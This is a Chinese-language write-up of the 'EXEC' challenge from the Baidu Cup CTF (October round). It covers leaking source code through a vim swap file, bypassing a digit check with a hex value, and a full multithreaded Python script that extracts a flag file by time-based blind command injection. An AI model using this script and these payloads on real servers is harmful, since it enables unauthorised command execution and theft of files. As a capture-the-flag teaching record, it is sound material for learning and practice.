---
title: 百度杯CTF比赛 十月场-EXEC
date: 2018-02-13 20:48:00
tags: [WEB,SKR]
categories: CTF
---
# 前言
这道题本来要用`bash反弹shell`的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。
# 分析
打开链接题目提示`no sign`。查看源代码发现这一行
```html
<meta language='utf-8' editor='vim'>
```
于是就想到了`vim信息泄露`，于是访问`.index.php.swp`成功下载了源代码
```php
<html>
<head>
<title>blind cmd exec</title>
<meta language='utf-8' editor='vim'>
</head>
</body>
<img src=pic.gif>
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
	setcookie('auth','tcp tunnel is forbidden!');
	if(isset($_POST['cmd'])){
		$command=$_POST[cmd];
		$result=exec($command);
		//echo $result;
	}
}else{
	die('no sign');
}
?>
</body>
</html>

```
分析源码，发现可以执行命令，但是没有回显。最先想到的就是bash反弹shell来执行命令，此外题目提示`tcp tunnel is forbidden!`，就只能反弹到udp的端口了。但是我没有公网ip的服务器咋办啊，于是联想到以前做过的sql盲注这次我来个命令盲注。
页面没有回显，就只能做基于时间的盲注了，脚本总的来说很简单，使用了多线程，下面贴出exp
```python
import requests,string,threading

def getLength(url,payload):
    data = {}
    length = 0
    for i in xrange(200):
        data['cmd']="a=$(%s);b=${#a};if test $b -eq %d;then sleep 3;fi"%(payload,i)
        try:
            r = requests.post(url,data=data,timeout=3)
        except:
            length = i
            print "the string length is {}".format(length)
            break
    return length
    
def getString(url,payload):
    global length,lock,curId,key
    data = {}
    words = string.uppercase+string.lowercase+string.digits+'/=+'
    i = 0
    while True:
        lock.acquire()
        if curId == length:
            lock.release()
            break
        i = curId
        curId += 1
        lock.release()
        for j in words:
            data['cmd']="a=$({});b=`expr substr $a {} 1`;if test $b = '{}';then sleep 8;fi".format(payload,i+1,j)
            try:
                r = requests.post(url,data=data,timeout=8)
            except:
                key[i] = j
                lock.acquire()
                print ''.join(key)
                lock.release()
                break


url = 'http://708ff2d40f1d48a5bef9408daed3fa0665c6180098394883.game.ichunqiu.com/?sign=0xabcdef'
payload = "base64 flag233.php -w 0" 
length = getLength(url,payload)
lock = threading.Lock()
curId = 0 #max(curId) = length - 1
key = ['?' for i in xrange(length)]

th=[]
for i in xrange(10):
    t = threading.Thread(target=getString,args=(url,payload))
    th.append(t)
for t in th:
    t.start()  
for t in th:
    t.join()
    
```
需要注意的是，题目使用的shell是`sh`（`dash`和`bash`的区别[看这个](http://ju.outofmemory.cn/entry/135)），所以在字串截取时不能使用`bash`的`${a:1:1}`的方式。还有就是在使用`expr substr`进行子串截取时目标字符串需要是单行的否则会出错，可以配合`head`和`tail`命令一行一行读取。这里我使用了`base64`命令将命令结果编码，防止换行或特殊字符干扰。注意要使用`base64 -w 0`关闭换行。
最后运行代码获得flag
```bash
root@kali:~# echo PD9waHAKCSRmbGFnPSdmbGFne2ExMWM4MjI3LWMyNGItNDAyNC1hMDRhLTdiOGIxOTYxZGM1ZH0nOwo/PgpoaGhoaGhoaGhoaCx0b28geW91bmcgdG9vIHNpbXBsZQo= | base64 -d
<?php
	$flag='flag{a11c8227-c24b-4024-a04a-7b8b1961dc5d}';
?>
hhhhhhhhhhh,too young too simple
root@kali:~# 

```
还需要注意的是，由于题目平台资源限制，使用多线程会导致平台反应过慢从而导致盲注的正确性降低。可以通过减少线程或是增大`sleep`的时间来增加正确率。
# 总结
算是另辟蹊径了，而且在写代码的时候学到了很多。原来不熟悉，不理解的命令用法更清楚了。但是还要注意的是，时间盲注在注入时间较长时就容易造成误差，有的字节会出错，反正再有别的解决方法时时间盲注不是优先选择的方法。